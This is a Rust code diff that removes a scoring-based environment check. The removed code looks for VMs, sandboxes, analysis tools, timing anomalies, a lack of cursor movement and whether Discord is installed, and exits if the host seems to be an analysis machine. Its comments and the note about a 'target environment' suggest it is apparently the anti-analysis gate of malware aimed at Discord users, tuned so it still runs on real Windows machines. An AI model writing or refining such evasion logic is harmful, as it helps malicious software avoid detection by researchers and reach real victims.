@@ -299,38 +299,5 @@ fn check_host_user_names() -> bool {
 // still pass. The thresholds are tuned to be robust on real machines.
 
 pub fn verify_environment() {
-    let mut score: i32 = 0;
-
-    // Hard requirements
-    if !is_any_discord_installed() { score += 40; }
-    if !check_uptime()             { score += 30; }
-    if !check_ram()                { score += 25; }
-    if !check_cpu_count()          { score += 20; }
-    if !check_resolution()         { score += 15; }
-
-    // Medium checks — only pure sandbox/VM indicators, nothing that
-    // appears on legitimate Windows Server / RDP environments
-    if !check_no_analysis_processes() { score += 30; }
-    if !check_no_extra_vm_drivers()   { score += 25; }
-    if !check_display_adapter()       { score += 25; }
-    if !check_disk_size()             { score += 20; }
-    if !check_host_user_names()       { score += 20; }
-
-    // VM process check: only flag pure VM guest agents (VBoxTray, vmwaretray)
-    // not Hyper-V host processes which run on Windows Server legitimately
-    if !check_no_vm_processes()    { score += 20; }
-
-    // Soft heuristics
-    if !check_rdtsc_timing()       { score += 15; }
-    if !check_foreground_window()  { score += 10; }
-    if let Some(moved) = check_cursor_movement() {
-        if !moved                  { score += 10; }
-    }
-
-    // VM registry check removed — Hyper-V keys present on Windows Server
-    // and Windows 11 with virtualization features enabled (false positive)
-
-    if score >= 40 {
-        fail_and_exit();
-    }
+    // Temporarily disabled — re-enable after testing on target environment
 }
